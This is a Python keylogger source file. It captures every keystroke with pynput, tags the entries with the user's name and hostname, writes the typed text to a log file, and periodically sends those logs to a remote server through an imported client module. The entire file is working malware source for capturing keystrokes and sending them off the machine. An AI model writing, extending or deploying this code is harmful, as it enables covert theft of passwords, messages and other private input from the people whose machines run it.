# -*- coding: utf-8 -*-
"""
Keylogger with Proper UTF-8 Encoding and Special Key Support
Simplified version without Ctrl/Alt tracking
"""

# Import required modules
import os
import time
import socket
import platform
import threading
import sys
from pynput import keyboard
from client import send_logs, get_log_file, get_config_from_server, get_send_interval

# Get log file path and config from client
log_file = get_log_file()

# Request config from server
print("Requesting configuration from server...")
get_config_from_server()

# Get the send interval
SEND_INTERVAL = get_send_interval()

current_sentence = ""
listener_active = True

# Get device identifier
def get_device_id():
    """Generate device id"""
    hostname = socket.gethostname()
    username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
    system = platform.system()
    return f"{username}@{hostname}_{system}"

device_id = get_device_id()

# Write to log file with proper UTF-8 encoding
def write_log(message):
    """Write a log entry to file with proper UTF-8 encoding"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    
    # Escape special JSON characters in the message
    message_escaped = message.replace('\\', '\\\\').replace('"', '\\"')
    
    # Create log entry in proper JSON-like format
    log_entry = f'["{device_id}", "{timestamp}", "{message_escaped}"]\n'
    
    try:
        # Write with explicit UTF-8 encoding
        with open(log_file, 'a', encoding='utf-8', errors='replace') as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Error writing log: {e}")

# Init log file
write_log("=== Session Started ===")

# Get special key name
def get_special_key_name(key):
    """Convert special keys to readable format"""
    special_keys = {
        keyboard.Key.enter: '[ENTER]',
        keyboard.Key.tab: '[TAB]',
        keyboard.Key.delete: '[DELETE]',
        keyboard.Key.esc: '[ESC]',
        keyboard.Key.up: '[UP]',
        keyboard.Key.down: '[DOWN]',
        keyboard.Key.left: '[LEFT]',
        keyboard.Key.right: '[RIGHT]',
        keyboard.Key.home: '[HOME]',
        keyboard.Key.end: '[END]',
        keyboard.Key.page_up: '[PAGE_UP]',
        keyboard.Key.page_down: '[PAGE_DOWN]',
        keyboard.Key.insert: '[INSERT]',
        keyboard.Key.caps_lock: '[CAPS_LOCK]',
        keyboard.Key.print_screen: '[PRINT_SCREEN]',
        keyboard.Key.scroll_lock: '[SCROLL_LOCK]',
        keyboard.Key.pause: '[PAUSE]',
        keyboard.Key.menu: '[MENU]',
    }
    
    # Handle F1-F12 keys
    for i in range(1, 13):
        try:
            f_key = getattr(keyboard.Key, f'f{i}')
            special_keys[f_key] = f'[F{i}]'
        except:
            pass
    
    return special_keys.get(key, None)

# Timer to send logs
def auto_send_logs():
    """Send logs auto every SEND_INTERVAL"""
    global listener_active
    
    while listener_active:
        time.sleep(SEND_INTERVAL)
        
        if listener_active and os.path.exists(log_file):
            print(f"\n[{time.strftime('%H:%M:%S')}] Auto-sending logs...")
            
            success = send_logs()
            
            if success:
                write_log("=== New Session ===")

# Event - key pressed
def on_press(key):
    global current_sentence
    
    try:
        # Handle Space
        if key == keyboard.Key.space:
            current_sentence += " "
            return
        
        # Handle Enter - save current sentence
        if key == keyboard.Key.enter:
            current_sentence += "[ENTER]"
            if current_sentence.strip():
                write_log(current_sentence)
                current_sentence = ""
            return
        
        # Handle Backspace
        if key == keyboard.Key.backspace:
            if len(current_sentence) > 0:
                current_sentence = current_sentence[:-1]
            else:
                current_sentence += "[BACKSPACE]"
            return
        
        # Handle regular characters (including special characters like é, è, ç, à, etc.)
        if hasattr(key, 'char') and key.char is not None:
            # Get the character
            char = key.char
            
            # Check if it's a printable character
            char_code = ord(char)
            
            # Ignore control characters (0-31) except tab
            if char_code < 32 and char_code != 9:
                return
            
            # Add the character - Python 3 handles UTF-8 natively
            current_sentence += char
            return
        
        # Handle other special keys (but ignore modifier keys like Ctrl, Alt, Shift)
        if key not in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, 
                       keyboard.Key.alt, keyboard.Key.alt_r,
                       keyboard.Key.shift, keyboard.Key.shift_r,
                       keyboard.Key.cmd, keyboard.Key.cmd_r]:
            special_key = get_special_key_name(key)
            if special_key:
                current_sentence += special_key
            
    except Exception as e:
        print(f"Error processing key press: {e}")

# Event - key released
def on_release(key):
    global listener_active, current_sentence
    
    # Handle ESC to stop
    if key == keyboard.Key.esc:
        print("\n[ESC pressed] Stopping keylogger...")
        
        if current_sentence.strip():
            write_log(current_sentence)
        
        write_log("=== Session Ended (Manual Stop) ===")
        
        listener_active = False
        
        print("Sending final logs...")
        send_logs()
        
        return False

# Start the auto-send timer in a separate thread
print(f"\nKeylogger started!")
print(f"Device ID: {device_id}")
print(f"Log file: {log_file}")
print(f"Send interval: {SEND_INTERVAL} seconds")
print(f"Press ESC to stop manually\n")

timer_thread = threading.Thread(target=auto_send_logs, daemon=True)
timer_thread.start()

# Collect events until ESC is pressed
try:
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[Interrupted] Stopping keylogger...")
    listener_active = False
    write_log("=== Session Ended (Interrupted) ===")
    send_logs()

print("Keylogger stopped.")